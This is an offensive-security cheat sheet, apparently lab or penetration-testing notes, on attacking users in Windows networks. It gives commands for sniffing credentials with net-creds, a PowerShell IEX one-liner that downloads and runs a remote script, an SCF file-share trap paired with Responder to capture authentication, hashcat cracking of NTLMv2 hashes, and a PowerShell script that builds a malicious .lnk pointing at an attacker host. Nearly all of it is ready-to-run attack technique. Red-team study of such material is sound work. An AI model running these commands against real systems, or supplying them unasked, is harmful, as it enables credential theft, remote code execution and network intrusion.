# Interacting with Users

## Traffic Capture

### tcpdump
```bash
tcpdump -i <interface>
```

### net-creds

```bash
net-creds -i <interface>
net-creds -f <pcap_file>
```

---

## Process Command Lines (Windows)

### Execute Remote PowerShell Script

```powershell
powershell IEX (iwr 'http://10.10.10.205/procmon.ps1')
```

---

## SCF File on File Share (Trigger Authentication)

1. Create a file named **@Inventory.scf**.
2. Place content that triggers authentication (e.g., icon path referencing attacker).
3. Run Responder:

```bash
sudo responder -wrf -v -I <interface>
```

---

## Cracking NTLMv2 Hashes

### Hashcat

```bash
hashcat -m 5600 <hash_file> <wordlist>
```

---

## Malicious .lnk File (Windows)

### Generate Authentication-Triggering LNK

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
